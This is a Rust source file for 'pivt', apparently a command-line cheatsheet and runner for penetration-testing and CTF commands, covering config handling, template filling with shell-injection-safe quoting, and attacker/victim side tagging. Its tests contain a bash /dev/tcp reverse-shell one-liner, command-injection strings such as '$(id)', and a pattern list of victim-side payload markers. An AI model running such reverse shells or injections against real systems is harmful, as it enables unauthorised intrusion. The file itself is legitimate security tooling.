use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::PathBuf;

/// A single cheatsheet command/template.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub category: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    pub template: String,
    #[serde(default)]
    pub tags: Vec<String>,
    /// Optional multi-step playbook: each entry runs in its own tab.
    /// `template` stays the primary/copyable line; `steps` drives the runner.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub steps: Vec<String>,
    /// Where the command is meant to run. `target` = on the victim (reverse
    /// shells, privesc enum, download one-liners): pivt copies it but never
    /// runs it locally with `x`.
    #[serde(default, skip_serializing_if = "Side::is_local")]
    pub side: Side,
    /// Run in a raw PTY (listeners): Ctrl-C/Ctrl-Z go to the remote shell as
    /// bytes instead of killing/stopping the local listener.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub raw_pty: bool,
    /// true if it came from the user's commands.toml (editable/removable)
    #[serde(skip)]
    pub user: bool,
}

/// Which machine a command is meant to run on.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Side {
    /// Your own box (the default).
    #[default]
    #[serde(alias = "attacker")]
    Local,
    /// The victim: paste it into a shell on the box.
    #[serde(alias = "victim")]
    Target,
}

impl Side {
    pub fn is_local(&self) -> bool {
        *self == Side::Local
    }
}

/// Status shown when `x` (or a recipe) refuses a target-side command.
pub const TARGET_SIDE_MSG: &str = "target-side: copy it (⏎) and run it in your shell on the box";

/// Prefix that puts the job's PTY in raw mode so control keys reach the
/// remote shell. `icrnl` keeps Enter working in a not-yet-upgraded shell.
pub const RAW_PTY_PREFIX: &str = "stty raw -echo icrnl 2>/dev/null; ";

impl Command {
    pub fn is_target(&self) -> bool {
        self.side == Side::Target
    }

    /// Wrap an already-filled step for the runner (raw PTY for listeners).
    pub fn wrap_for_run(&self, filled: &str) -> String {
        if self.raw_pty {
            format!("{RAW_PTY_PREFIX}{filled}")
        } else {
            filled.to_string()
        }
    }

    /// Lines to run: the explicit `steps`, else the single `template`.
    pub fn run_steps(&self) -> Vec<String> {
        if self.steps.is_empty() {
            vec![self.template.clone()]
        } else {
            self.steps.clone()
        }
    }
}

#[derive(Debug, Default, Deserialize)]
struct CommandFile {
    #[serde(default, rename = "command")]
    commands: Vec<Command>,
}

#[derive(Debug, Default, Serialize)]
struct CommandFileOut<'a> {
    #[serde(rename = "command")]
    commands: Vec<&'a Command>,
}

/// The official pivt Discord application (name "pivt", art asset `pivt`).
/// Project home; default target of the "get pivt" presence button.
pub const REPO_URL: &str = "https://github.com/Th7bo/pivt";
pub const DEFAULT_DISCORD_APP_ID: &str = "1574922609542303924";

/// Config = the persisted variable values.
// NOTE: array fields are declared BEFORE `vars` so toml serializes them first;
// a TOML table must come after top-level keys or those keys nest under it.
#[derive(Debug, Default, Serialize, Deserialize)]
pub struct Config {
    /// Pinned command keys ("category/name").
    #[serde(default)]
    pub favorites: Vec<String>,
    /// Recently copied/run command keys, most-recent first.
    #[serde(default)]
    pub recent: Vec<String>,
    /// Background style: true = flowing ASCII field, false = starfield.
    #[serde(default)]
    pub flow_bg: bool,
    /// Enable Discord Rich Presence (opt-in).
    #[serde(default)]
    pub discord_rpc: bool,
    /// Discord application (client) id for Rich Presence; empty = use the
    /// bundled pivt app ([`DEFAULT_DISCORD_APP_ID`]).
    #[serde(default)]
    pub discord_app_id: String,
    /// URL for the "get pivt" presence button; empty = [`REPO_URL`].
    #[serde(default)]
    pub discord_link: String,
    #[serde(default)]
    pub vars: BTreeMap<String, String>,
}

pub fn config_dir() -> PathBuf {
    dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("pivt")
}

pub fn config_file() -> PathBuf {
    config_dir().join("config.toml")
}

pub fn user_commands_file() -> PathBuf {
    config_dir().join("commands.toml")
}

/// The shared target file used by the user's `target` shell function
/// (~/.cache/ctf-target, honoring XDG_CACHE_HOME).
pub fn ctf_target_file() -> PathBuf {
    let base = std::env::var_os("XDG_CACHE_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            dirs::home_dir().unwrap_or_else(|| PathBuf::from(".")).join(".cache")
        });
    base.join("ctf-target")
}

pub fn read_ctf_target() -> Option<String> {
    let s = std::fs::read_to_string(ctf_target_file()).ok()?;
    let s = s.trim().to_string();
    if s.is_empty() {
        None
    } else {
        Some(s)
    }
}

/// Mirror RHOST into the shared target file so `target`/$TARGET see it too.
pub fn write_ctf_target(ip: &str) {
    if ip.is_empty() {
        return;
    }
    let path = ctf_target_file();
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    let _ = std::fs::write(path, format!("{ip}\n"));
}

/// Bundled default cheatsheet, compiled into the binary.
const BUNDLED: &str = include_str!("default_commands.toml");

/// Load bundled commands then merge/override with the user's file.
/// A user command with the same (category,name) overrides a bundled one.
pub fn load_commands() -> Vec<Command> {
    let mut out: Vec<Command> = parse_commands(BUNDLED, false);

    let path = user_commands_file();
    if let Ok(txt) = std::fs::read_to_string(&path) {
        let user = parse_commands(&txt, true);
        for uc in user {
            if let Some(slot) = out
                .iter_mut()
                .find(|c| c.category == uc.category && c.name == uc.name)
            {
                *slot = uc;
            } else {
                out.push(uc);
            }
        }
    }
    out
}

/// The bundled commands only (for tests that cross-check bundled data).
#[cfg(test)]
pub fn load_bundled_for_tests() -> Vec<Command> {
    parse_commands(BUNDLED, false)
}

fn parse_commands(txt: &str, user: bool) -> Vec<Command> {
    match toml::from_str::<CommandFile>(txt) {
        Ok(f) => f
            .commands
            .into_iter()
            .map(|mut c| {
                c.user = user;
                c
            })
            .collect(),
        Err(_) => Vec::new(),
    }
}

/// Persist all user commands to commands.toml.
pub fn save_user_commands(all: &[Command]) -> std::io::Result<()> {
    std::fs::create_dir_all(config_dir())?;
    let users: Vec<&Command> = all.iter().filter(|c| c.user).collect();
    let out = CommandFileOut { commands: users };
    let txt = toml::to_string_pretty(&out)
        .unwrap_or_default();
    std::fs::write(user_commands_file(), txt)
}

pub fn load_config() -> Config {
    if let Ok(txt) = std::fs::read_to_string(config_file()) {
        toml::from_str(&txt).unwrap_or_default()
    } else {
        Config::default()
    }
}

pub fn save_config(cfg: &Config) -> std::io::Result<()> {
    std::fs::create_dir_all(config_dir())?;
    let txt = toml::to_string_pretty(cfg).unwrap_or_default();
    std::fs::write(config_file(), txt)
}

/// Extract `<PLACEHOLDER>` tokens (UPPERCASE / digits / underscore) from a template,
/// preserving first-seen order, de-duplicated.
pub fn extract_placeholders(template: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let bytes = template.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            if let Some(close) = template[i + 1..].find('>') {
                let inner = &template[i + 1..i + 1 + close];
                if !inner.is_empty()
                    && inner
                        .chars()
                        .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
                {
                    let s = inner.to_string();
                    if !out.contains(&s) {
                        out.push(s);
                    }
                    i = i + 1 + close + 1;
                    continue;
                }
            }
        }
        i += 1;
    }
    out
}

/// Fill a template from the vars map. Empty/missing vars keep the `<NAME>` marker
/// so the user can see what's still unset.
///
/// Templates are POSIX `sh` command lines, so every substituted value is
/// shell-quoted for the spot it lands in: a value can never end a quote early,
/// split into several words, or start a `$(…)` / `;` of its own. Values made
/// only of "safe" characters (IPs, ports, plain paths, URLs without `&`/`?`)
/// are inserted as-is so the result stays readable.
pub fn fill_template(template: &str, vars: &BTreeMap<String, String>) -> String {
    let mut out = String::with_capacity(template.len() + 16);
    let mut ctx = Quote::None;
    let mut rest = template;
    while let Some(c) = rest.chars().next() {
        if c == '<' {
            if let Some((name, after)) = placeholder_at(rest) {
                match vars.get(name).filter(|v| !v.is_empty()) {
                    Some(v) => out.push_str(&quote_for(v, ctx)),
                    None => {
                        out.push('<');
                        out.push_str(name);
                        out.push('>');
                    }
                }
                rest = after;
                continue;
            }
        }
        let len = c.len_utf8();
        match (ctx, c) {
            (Quote::None, '\\') | (Quote::Double, '\\') => {
                // an escape: copy it together with the char it escapes
                let n = rest[len..].chars().next().map_or(0, char::len_utf8);
                out.push_str(&rest[..len + n]);
                rest = &rest[len + n..];
                continue;
            }
            (Quote::None, '\'') => ctx = Quote::Single,
            (Quote::None, '"') => ctx = Quote::Double,
            (Quote::Single, '\'') | (Quote::Double, '"') => ctx = Quote::None,
            _ => {}
        }
        out.push(c);
        rest = &rest[len..];
    }
    out
}

/// The shell quoting context at some point in a command line.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Quote {
    None,
    Single,
    Double,
}

/// `<NAME>` at the start of `s`: (NAME, text after the `>`).
fn placeholder_at(s: &str) -> Option<(&str, &str)> {
    let body = s.strip_prefix('<')?;
    let close = body.find('>')?;
    let name = &body[..close];
    let ok = !name.is_empty()
        && name.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');
    ok.then(|| (name, &body[close + 1..]))
}

/// Characters that never need quoting in `sh` (anywhere in a word).
fn shell_safe(v: &str) -> bool {
    !v.is_empty()
        && v.chars().all(|c| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c))
}

/// POSIX single-quote `v` as one word: `it's` → `'it'\''s'`.
pub fn shell_quote(v: &str) -> String {
    if shell_safe(v) {
        return v.to_string();
    }
    format!("'{}'", v.replace('\'', "'\\''"))
}

/// Render `v` so it reads back literally inside quoting context `ctx`.
fn quote_for(v: &str, ctx: Quote) -> String {
    match ctx {
        Quote::None => match v.strip_prefix("~/") {
            // keep `~/` expandable (WORDLIST=~/lists/x.txt), quote the rest
            Some(rest) if !rest.is_empty() => format!("~/{}", shell_quote(rest)),
            _ => shell_quote(v),
        },
        // inside '…': close, emit an escaped quote, reopen
        Quote::Single => v.replace('\'', "'\\''"),
        // inside "…": only \ " $ ` are special
        Quote::Double => {
            let mut s = String::with_capacity(v.len());
            for c in v.chars() {
                if matches!(c, '\\' | '"' | '$' | '`') {
                    s.push('\\');
                }
                s.push(c);
            }
            s
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    #[test]
    fn placeholders_extract_in_order_dedup() {
        let t = "nc <LHOST> <LPORT> < <FILE> # <LHOST>";
        assert_eq!(extract_placeholders(t), vec!["LHOST", "LPORT", "FILE"]);
    }

    #[test]
    fn fill_keeps_unset_marker() {
        let mut v = BTreeMap::new();
        v.insert("LHOST".to_string(), "10.10.14.5".to_string());
        v.insert("LPORT".to_string(), "".to_string());
        let out = fill_template("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", &v);
        assert_eq!(out, "bash -i >& /dev/tcp/10.10.14.5/<LPORT> 0>&1");
    }


    const HOSTILE: &[&str] = &["a'b", "$(id)", "x;y", "a b", "\"q\"", "`id`&|<>*?~\\#!"];

    /// Every placeholder of every bundled template/step, filled with `v`.
    fn fill_all(c: &Command, v: &str) -> Vec<String> {
        c.run_steps()
            .iter()
            .chain(std::iter::once(&c.template))
            .map(|t| {
                let vars = extract_placeholders(t).into_iter().map(|p| (p, v.to_string())).collect();
                fill_template(t, &vars)
            })
            .collect()
    }

    fn sh_syntax_ok(cmd: &str) -> Result<(), String> {
        let out = std::process::Command::new("sh").args(["-n", "-c", cmd]).output().unwrap();
        if out.status.success() {
            Ok(())
        } else {
            Err(String::from_utf8_lossy(&out.stderr).into_owned())
        }
    }

    /// The words `sh` would pass to the command, without running it: `set --`
    /// only assigns them. Only used on templates without operators/expansions.
    fn sh_words(cmd: &str) -> Vec<String> {
        let script = format!("set -- {cmd}\nprintf '%s\\0' \"$@\"");
        let out = std::process::Command::new("sh").args(["-c", &script]).output().unwrap();
        assert!(out.status.success(), "{cmd}: {}", String::from_utf8_lossy(&out.stderr));
        let mut words: Vec<String> =
            String::from_utf8_lossy(&out.stdout).split('\0').map(String::from).collect();
        words.pop();
        words
    }

    /// No shell operators, redirections or expansions outside quotes.
    fn plain_simple_command(t: &str) -> bool {
        let mut ctx = Quote::None;
        let mut rest = t;
        while let Some(c) = rest.chars().next() {
            if let Some((_, after)) = placeholder_at(rest) {
                rest = after;
                continue;
            }
            let mut len = c.len_utf8();
            match (ctx, c) {
                (Quote::None, '\\') => len += rest[1..].chars().next().map_or(0, char::len_utf8),
                (Quote::None, '\'') => ctx = Quote::Single,
                (Quote::None, '"') => ctx = Quote::Double,
                (Quote::Single, '\'') | (Quote::Double, '"') => ctx = Quote::None,
                (Quote::None, '|' | '&' | ';' | '<' | '>' | '`' | '$' | '(' | ')' | '*' | '?' | '~' | '#') => return false,
                (Quote::Double, '$' | '`') => return false,
                _ => {}
            }
            rest = &rest[len..];
        }
        true
    }

    #[test]
    fn hostile_values_keep_every_bundled_template_valid_sh() {
        let all = parse_commands(BUNDLED, false);
        for c in &all {
            for v in HOSTILE {
                for filled in fill_all(c, v) {
                    if let Err(e) = sh_syntax_ok(&filled) {
                        panic!("{}/{} with {v:?}:\n{filled}\n{e}", c.category, c.name);
                    }
                }
            }
        }
    }

    #[test]
    fn hostile_values_round_trip_as_literal_words() {
        // For every bundled template that is a plain simple command, a hostile
        // value must not add or remove words, and must appear literally.
        let all = parse_commands(BUNDLED, false);
        let mut checked = 0;
        for c in &all {
            for t in c.run_steps().iter().chain(std::iter::once(&c.template)) {
                if extract_placeholders(t).is_empty() || !plain_simple_command(t) {
                    continue;
                }
                let fill = |v: &str| {
                    let vars = extract_placeholders(t).into_iter().map(|p| (p, v.to_string())).collect();
                    fill_template(t, &vars)
                };
                let base = sh_words(&fill("PIVTX"));
                for v in HOSTILE {
                    let got = sh_words(&fill(v));
                    assert_eq!(got.len(), base.len(), "{}/{} {v:?}: {got:?}", c.category, c.name);
                    for (g, b) in got.iter().zip(&base) {
                        assert_eq!(*g, b.replace("PIVTX", v), "{}/{} {v:?}", c.category, c.name);
                    }
                }
                checked += 1;
            }
        }
        assert!(checked > 50, "only {checked} templates checked");
    }

    #[test]
    fn quoting_per_context_reads_back_literally() {
        // contexts that the bundled set uses, checked by actually printing the
        // words (printf only; a broken quote would run `id`, harmlessly)
        let templates = [
            "printf '[%s]' <V>",
            "printf '[%s]' pre<V>post",
            "printf '[%s]' 'in <V> side'",
            "printf '[%s]' \"in <V> side\"",
            "printf '[%s]' -p<V>",
            "printf '[%s]' <V>:<V>@host",
        ];
        for v in HOSTILE.iter().chain(&["plain", "it's", "\\", "'"]) {
            for t in templates {
                let mut vars = BTreeMap::new();
                vars.insert("V".to_string(), v.to_string());
                let filled = fill_template(t, &vars);
                let out = std::process::Command::new("sh").args(["-c", &filled]).output().unwrap();
                let shown = String::from_utf8_lossy(&out.stdout).into_owned();
                let want_v = v.to_string();
                let want = match t {
                    t if t.ends_with(" <V>") => format!("[{want_v}]"),
                    t if t.contains("pre<V>") => format!("[pre{want_v}post]"),
                    t if t.contains("-p<V>") => format!("[-p{want_v}]"),
                    t if t.contains(":<V>") => format!("[{want_v}:{want_v}@host]"),
                    _ => format!("[in {want_v} side]"),
                };
                assert_eq!(shown, want, "template {t:?} value {v:?} → {filled}");
            }
        }
    }

    #[test]
    fn safe_values_stay_readable() {
        let mut v = BTreeMap::new();
        v.insert("RHOST".to_string(), "10.10.11.5".to_string());
        v.insert("URL".to_string(), "http://10.10.11.5:8080/a-b_c".to_string());
        v.insert("PASS".to_string(), "P@ss w0rd!".to_string());
        assert_eq!(fill_template("curl <URL> -x <RHOST>", &v), "curl http://10.10.11.5:8080/a-b_c -x 10.10.11.5");
        assert_eq!(fill_template("x -p <PASS>", &v), "x -p 'P@ss w0rd!'");
        assert_eq!(fill_template("x -p '<PASS>'", &v), "x -p 'P@ss w0rd!'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
        // a leading ~/ stays expandable, the rest is quoted
        v.insert("WORDLIST".to_string(), "~/my lists/r.txt".to_string());
        assert_eq!(fill_template("ffuf -w <WORDLIST>", &v), "ffuf -w ~/'my lists/r.txt'");
    }

    #[test]
    fn config_roundtrip_order() {
        let mut c = Config::default();
        c.favorites.push("nmap/Quick".into());
        c.recent.push("web/ffuf".into());
        c.vars.insert("RHOST".into(), "10.0.0.1".into());
        let txt = toml::to_string_pretty(&c).unwrap();
        // arrays must appear before the [vars] table
        let fav_pos = txt.find("favorites").unwrap();
        let vars_pos = txt.find("[vars]").unwrap();
        assert!(fav_pos < vars_pos, "bad order:\n{txt}");
        let back: Config = toml::from_str(&txt).unwrap();
        assert_eq!(back.favorites, vec!["nmap/Quick".to_string()]);
        assert_eq!(back.vars.get("RHOST").unwrap(), "10.0.0.1");
    }

    #[test]
    fn bundled_victim_commands_are_target_side() {
        let all = parse_commands(BUNDLED, false);
        let key = |c: &Command| format!("{}/{}", c.category, c.name);
        // whole categories that only make sense inside a shell on the box
        for c in all.iter().filter(|c| ["upgrade", "win"].contains(&c.category.as_str())) {
            assert!(c.is_target(), "{} should be side = \"target\"", key(c));
        }
        // shells: everything that connects back to LHOST is a payload
        // (msfvenom only builds one locally)
        for c in all.iter().filter(|c| c.category == "shells") {
            let payload = c.template.contains("<LHOST>") && !c.template.starts_with("msfvenom");
            assert_eq!(c.is_target(), payload, "{} side", key(c));
        }
        // anything that looks like a payload, privesc enum or a victim-side pull
        let victim = [
            "/dev/tcp/", "mkfifo", "-e /bin/sh", "pty.spawn", "linpeas", "winPEAS", "sudo -l",
            "-perm -4000", "find / -writable", "certutil", "Invoke-WebRequest", "iwr ", "fsockopen",
            "TCPClient", "wget http://<LHOST>", "curl http://<LHOST>",
        ];
        for c in &all {
            let t = c.run_steps().join("\n");
            if victim.iter().any(|v| t.contains(v)) {
                assert!(c.is_target(), "{} looks victim-side but isn't marked", key(c));
            }
        }
        // listeners stay local and get a raw PTY
        for name in ["nc listener", "rlwrap listener"] {
            let c = all.iter().find(|c| c.category == "shells" && c.name == name).unwrap();
            assert!(!c.is_target() && c.raw_pty, "{name}");
            assert!(c.description.contains("penelope") && c.description.contains("pwncat"));
        }
        // and the attacker basics are still runnable
        for k in ["nmap/Quick top-ports", "transfer/python http server", "pivot/chisel server", "misc/add /etc/hosts"] {
            let c = all.iter().find(|c| key(c) == k).unwrap();
            assert!(!c.is_target(), "{k}");
        }
    }

    #[test]
    fn side_parses_and_roundtrips() {
        let txt = r#"
[[command]]
category = "x"
name = "a"
template = "id"
side = "target"

[[command]]
category = "x"
name = "b"
template = "id"
side = "attacker"

[[command]]
category = "x"
name = "c"
template = "nc -lvnp 1"
raw_pty = true
"#;
        let mut cs = parse_commands(txt, true);
        assert_eq!(cs.iter().map(|c| c.side).collect::<Vec<_>>(), vec![Side::Target, Side::Local, Side::Local]);
        assert!(cs[2].raw_pty && !cs[0].raw_pty);
        assert_eq!(cs[2].wrap_for_run("nc -lvnp 1"), format!("{RAW_PTY_PREFIX}nc -lvnp 1"));
        assert_eq!(cs[0].wrap_for_run("id"), "id");
        // serialized form keeps target/raw_pty, omits defaults
        cs[1].side = Side::Local;
        let out = toml::to_string_pretty(&CommandFileOut { commands: cs.iter().collect() }).unwrap();
        assert_eq!(out.matches("side = \"target\"").count(), 1, "{out}");
        assert_eq!(out.matches("raw_pty = true").count(), 1, "{out}");
        assert!(!out.contains("local"), "{out}");
        let back = parse_commands(&out, true);
        assert!(back[0].is_target() && back[2].raw_pty);
    }

    #[test]
    fn bundled_parses() {
        let c = parse_commands(BUNDLED, false);
        assert!(c.len() > 40);
        assert!(c.iter().all(|x| !x.template.is_empty()));
    }
}
